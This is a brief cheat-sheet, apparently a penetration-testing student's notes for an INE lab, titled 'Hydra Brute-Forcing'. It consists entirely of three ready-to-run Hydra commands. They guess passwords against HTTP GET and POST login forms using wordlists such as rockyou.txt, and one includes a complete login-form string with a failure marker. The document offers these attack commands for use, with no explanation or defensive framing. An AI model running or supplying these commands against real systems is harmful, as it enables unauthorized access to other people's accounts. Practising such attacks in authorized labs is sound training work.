# Hydra Brute-Forcing

hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target_ip> -s <target_port> http-get

hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target_ip> -s <target_port> http-post-form 

hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /root/Desktop/wordlists/100-common-passwords.txt target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password"
